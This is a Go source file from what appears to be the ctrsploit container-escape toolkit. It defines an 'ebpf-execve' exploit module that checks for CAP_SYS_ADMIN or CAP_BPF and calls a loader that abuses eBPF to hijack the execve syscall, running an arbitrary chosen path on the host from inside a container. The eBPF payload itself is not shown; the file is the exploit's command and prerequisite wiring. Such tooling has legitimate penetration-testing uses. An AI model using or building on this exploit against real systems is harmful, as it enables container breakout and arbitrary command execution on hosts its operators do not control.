package execve

import (
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v3"
)

var (
	aliases      = []string{"execve"}
	flagsExploit = []cli.Flag{
		&cli.StringFlag{
			Name:    "path",
			Aliases: []string{"p"},
			Usage:   "absolute path to execute, if the -c option is set, the path will auto prepend with /proc/[pid]/root/",
			Value:   "/usr/bin/id",
		},
		&cli.BoolFlag{
			Name:    "relative",
			Aliases: []string{"r"},
			Usage: "If this option is set, the path is treated as a path within a container. " +
				"It will be automatically prepended with /proc/[pid]/root/ to enable access from the host. " +
				"Otherwise, the path is considered a host path and executed directly by the eBPF program.",
			Value: false,
		},
	}
	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd     = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "ebpf-execve",
		Description: "abuse eBPF to hijack execve syscall to run arbitrary commands",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites: prerequisite.Or(
			&capability.CapSysAdminBnd,
			&capability.CapBpfBnd,
		),
		ExploitablePrerequisites: &capability.CapSysAdminEff,
	},
}

func (v *vulnerability) Exploit(cmd *cli.Command) (err error) {
	if err := v.BaseVulnerability.Exploit(cmd); err != nil {
		return err
	}
	path := cmd.String("path")
	relative := cmd.Bool("relative")
	return Exploit(path, relative)
}

func Exploit(path string, relative bool) (err error) {
	return Load(path, relative)
}
